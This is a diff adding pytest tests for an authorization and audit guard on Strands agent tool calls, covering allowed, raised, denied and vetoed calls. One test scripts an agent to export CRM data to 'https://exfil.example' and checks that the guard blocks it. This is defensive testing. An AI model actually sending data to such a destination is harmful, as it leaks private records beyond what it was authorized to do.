@@ -26,6 +26,10 @@ import pytest
 
 pytest.importorskip("strands")
 
+from strands import Agent  # noqa: E402
+
+from attenu_guard.reasons import BodyState, Capture  # noqa: E402
+
 from attenu_guard import (  # noqa: E402
     AuditLog,
     Authority,
@@ -327,3 +331,177 @@ def test_demo_main_runs_clean(capsys):
     assert "ALLOW" in out
     assert "DENY" in out
     assert "audit chain verified" in out
+
+
+# ==========================================================================
+# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
+# This adapter never calls the tool body itself -- Strands does -- so
+# FRAMEWORK_POST_HOOK is opt-in (strict_single_hook=True); the default is
+# the Guard's own honest PRE_HOOK_ONLY, and no outcome is ever recorded.
+# ==========================================================================
+def _v2_single_agent(script, *, strict_single_hook=True, authority=None):
+    root = Guard.issue("orchestrator", authority or demo.ORCHESTRATOR_AUTHORITY,
+                       task="root", schema_version=2)
+    agent = Agent(
+        name="orchestrator",
+        model=demo.ScriptedModel(script),
+        tools=[demo.crm_query, demo.crm_export],
+        callback_handler=None,
+    )
+    dg = dg_strands.DelegationGuard(
+        root_guard=root, root_agent=agent, scope_for=demo.SCOPE_FOR,
+        authority_for=demo.authority_for, strict_single_hook=strict_single_hook,
+    )
+    agent.hooks.add_hook(dg)
+    return root, agent, dg
+
+
+def test_v2_allowed_call_records_a_returned_outcome():
+    root, agent, dg = _v2_single_agent([
+        ("tool", "crm_query", {"rows": 10}),
+        ("text", "done"),
+    ])
+    agent("go")
+
+    entries = root.audit_log().entries
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
+    assert allow["capture"] == Capture.FRAMEWORK_POST_HOOK
+    assert allow["adapter"]["module"] == "attenu_guard.adapters.strands"
+    assert outcome["body_state"] == BodyState.RETURNED
+    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
+    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0
+    assert root.complete()
+
+
+def test_v2_a_tool_that_raises_records_a_raised_outcome():
+    from strands import tool as strands_tool
+
+    @strands_tool
+    def crm_query(rows: int) -> str:
+        """Raises instead of returning.
+
+        Args:
+            rows: n.
+        """
+        raise ValueError("boom")
+
+    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
+    agent = Agent(
+        name="orchestrator",
+        model=demo.ScriptedModel([("tool", "crm_query", {"rows": 10}), ("text", "x")]),
+        tools=[crm_query],
+        callback_handler=None,
+    )
+    dg = dg_strands.DelegationGuard(
+        root_guard=root, root_agent=agent, scope_for=demo.SCOPE_FOR,
+        authority_for=demo.authority_for, strict_single_hook=True,
+    )
+    agent.hooks.add_hook(dg)
+    agent("go")
+
+    entries = root.audit_log().entries
+    outcome = next(e for e in entries if e["event"] == "outcome")
+    assert outcome["body_state"] == BodyState.RAISED
+    assert outcome["error_code"] == "ValueError"
+
+
+def test_v2_denied_call_never_records_an_outcome():
+    root, agent, dg = _v2_single_agent(
+        [("tool", "crm_export", {"destination": "https://exfil.example"}), ("text", "x")],
+        authority=demo.SUMMARIZER_AUTHORITY,  # no crm.export
+    )
+    agent("go")
+
+    assert demo.WORLD["exported_to"] == []
+    entries = root.audit_log().entries
+    assert [e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_export"] == []
+    assert [e for e in entries if e["event"] == "outcome"] == []
+
+
+def test_v1_chain_gets_no_capture_adapter_or_outcome():
+    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")  # v1, default
+    agent = Agent(
+        name="orchestrator",
+        model=demo.ScriptedModel([("tool", "crm_query", {"rows": 10}), ("text", "done")]),
+        tools=[demo.crm_query],
+        callback_handler=None,
+    )
+    dg = dg_strands.DelegationGuard(
+        root_guard=root, root_agent=agent, scope_for=demo.SCOPE_FOR,
+        authority_for=demo.authority_for, strict_single_hook=True,  # attested, but v1 stays unchanged
+    )
+    agent.hooks.add_hook(dg)
+    agent("go")
+
+    entries = root.audit_log().entries
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    assert "capture" not in allow and "adapter" not in allow and "call_id" not in allow
+    assert [e for e in entries if e["event"] == "outcome"] == []
+
+
+def test_v2_default_mode_is_pre_hook_only_and_never_records_an_outcome():
+    """strict_single_hook defaults to False: every v2 allow gets the Guard's own honest
+    Capture.PRE_HOOK_ONLY, and after_tool_call never calls record_outcome() -- not merely
+    "no outcome happens to be missing", but zero outcome events at all, and the body still
+    genuinely runs (this is authorization-only, not a broken integration)."""
+    root, agent, dg = _v2_single_agent(
+        [("tool", "crm_query", {"rows": 10}), ("text", "done")],
+        strict_single_hook=False,
+    )
+    agent("go")
+
+    assert ("crm_query", 10) in demo.WORLD["executed"]
+    entries = root.audit_log().entries
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    assert allow["capture"] == Capture.PRE_HOOK_ONLY
+    assert allow["adapter"]["hook_path"] == "Guard.check"  # the Guard's own default, not ours
+    assert "call_id" in allow  # still a genuine v2 chain -- just no outcome recorded against it
+    assert [e for e in entries if e["event"] == "outcome"] == []
+    assert root.complete()
+
+
+def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
+    """Codex review (all six earlier adapters, round 2, finding 4): _freeze() must never call
+    ANY copy protocol (copy.deepcopy included) on a container -- a class free to implement
+    __deepcopy__ to return `self` would otherwise make a "snapshot" alias the live object."""
+    class AliasingList(list):
+        def __deepcopy__(self, memo):
+            return self
+
+    live = {"input": {"x": AliasingList([1])}}
+    snapshot = dg_strands._snapshot_params(live)
+
+    assert snapshot["x"] is not live["input"]["x"], "the snapshot aliased the live mutable container"
+    live["input"]["x"].append(2)
+    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"
+
+
+def test_v2_third_party_cancellation_after_our_allow_records_abandoned():
+    """HONESTY NOTE (strict mode): this adapter's own denial never stashes a pending entry, so
+    a cancel_message seen here can only be a THIRD-PARTY before-hook that vetoed the call AFTER
+    this adapter already authorized it -- ABANDONED, not a fabricated RETURNED, and error_code
+    is NOT attached (Guard.record_outcome only permits it together with RAISED)."""
+    from strands.hooks import BeforeToolCallEvent, HookProvider, HookRegistry
+
+    class ThirdPartyVeto(HookProvider):
+        def register_hooks(self, registry: HookRegistry, **kwargs) -> None:
+            registry.add_callback(BeforeToolCallEvent, self._veto)
+
+        @staticmethod
+        def _veto(event: BeforeToolCallEvent) -> None:
+            if event.tool_use["name"] == "crm_query" and not event.cancel_tool:
+                event.cancel_tool = "vetoed by a third party, after attenu-guard already allowed it"
+
+    root, agent, dg = _v2_single_agent([("tool", "crm_query", {"rows": 10}), ("text", "done")])
+    # Registered AFTER dg, so it runs after dg's own before_tool_call already authorized --
+    # HookRegistry.invoke_callbacks runs every callback in registration order for
+    # BeforeToolCallEvent (should_reverse_callbacks is False there), so this fires second.
+    agent.hooks.add_hook(ThirdPartyVeto())
+    agent("go")
+
+    assert ("crm_query", 10) not in demo.WORLD["executed"]
+    entries = root.audit_log().entries
+    outcome = next(e for e in entries if e["event"] == "outcome")
+    assert outcome["body_state"] == BodyState.ABANDONED
+    assert "error_code" not in outcome
